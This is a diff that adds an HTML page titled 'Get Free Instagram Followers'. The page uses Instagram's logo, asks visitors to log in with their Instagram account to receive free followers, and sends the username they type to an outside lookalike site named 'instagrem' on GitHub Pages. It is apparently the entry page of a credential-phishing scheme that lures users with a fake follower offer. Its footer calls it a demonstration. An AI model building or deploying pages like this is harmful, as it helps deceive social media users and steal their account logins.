@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Get Free Instagram Followers</title>
+    <link rel="icon" type="img.icon.png" href="icon.png">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <header>
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo">
+            <h1>Free Instagram Followers</h1>
+        </div>
+    </header>
+
+    <section class="main-content">
+        <h2>Boost Your Instagram Following!</h2>
+        <p>Login with your instagram account to get followers.</p>
+
+        <div class="form-container">
+            <input type="text" id="username" placeholder="Enter your Instagram username" />
+            <button onclick="getFollowers()">Connect account </button>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 Free Followers | All Rights Reserved</p>
+        <p>Disclaimer: This is a demonstration website. We are not affiliated with Instagram in any way.</p>
+    </footer>
+
+    <script>
+        function getFollowers() {
+            let username = document.getElementById('username').value;
+
+            // Redirect to the new URL, passing the username as a query parameter
+            window.location.href = `https://thunderous-123.github.io/instagrem/?username=${username}`;
+
+        }
+    </script>
+
+
+</body>
+<style>
+    /* Reset some default styles */
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    /* Body Styling */
+    body {
+        font-family: 'Arial', sans-serif;
+        background: #fafafa;
+        color: #333;
+    }
+
+    /* Header Styling */
+    header {
+        background: #f5f5f5;
+        padding: 20px;
+        text-align: center;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    header .logo {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+    }
+
+    header img {
+        width: 40px;
+        height: 40px;
+    }
+
+    header h1 {
+        font-size: 28px;
+        color: #3f729b;
+    }
+
+    /* Main Content Section */
+    .main-content {
+        text-align: center;
+        padding: 50px 20px;
+    }
+
+    .main-content h2 {
+        font-size: 36px;
+        color: #333;
+        margin-bottom: 10px;
+    }
+
+    .main-content p {
+        font-size: 18px;
+        color: #555;
+        margin-bottom: 20px;
+    }
+
+    /* Form Container */
+    .form-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 10px;
+        margin-top: 20px;
+    }
+
+    .form-container input {
+        width: 300px;
+        padding: 12px 20px;
+        border: 2px solid #ddd;
+        border-radius: 5px;
+        font-size: 16px;
+        color: #555;
+    }
+
+    .form-container button {
+        background: #3897f0;
+        color: white;
+        padding: 12px 20px;
+        font-size: 18px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background 0.3s ease;
+    }
+
+    .form-container button:hover {
+        background: #2980b9;
+    }
+
+    /* Footer Styling */
+    footer {
+        background: #f5f5f5;
+        padding: 20px;
+        text-align: center;
+        color: #888;
+        font-size: 14px;
+        border-top: 1px solid #ddd;
+    }
+
+    footer p {
+        margin: 5px 0;
+    }
+</style>
+
+</html>
